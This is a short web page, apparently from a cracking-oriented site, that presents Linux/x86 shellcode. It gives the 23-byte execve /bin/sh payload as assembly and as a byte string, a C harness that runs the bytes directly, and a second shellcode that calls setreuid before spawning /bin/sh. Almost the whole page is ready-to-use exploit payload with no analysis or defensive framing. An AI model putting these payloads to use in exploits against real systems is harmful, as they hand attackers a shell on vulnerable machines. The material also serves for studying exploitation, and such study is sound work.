<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <title>Methode - Shellcode</title>
</head>
[index](index.html) [Cracking](cracking.html)

## Linux/x86 execve /bin/sh shellcode 23 bytes

xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

********************************
#include <stdio.h>
#include <string.h>
 
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}

## Autre shellcode
"\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB
 \x13\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08\x89
 \x43\x0C\xB0\x0B\x8D\x4B\x08\x8D\x53\x0C\xCD
 \x80\xE8\xE5\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F
 \x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42"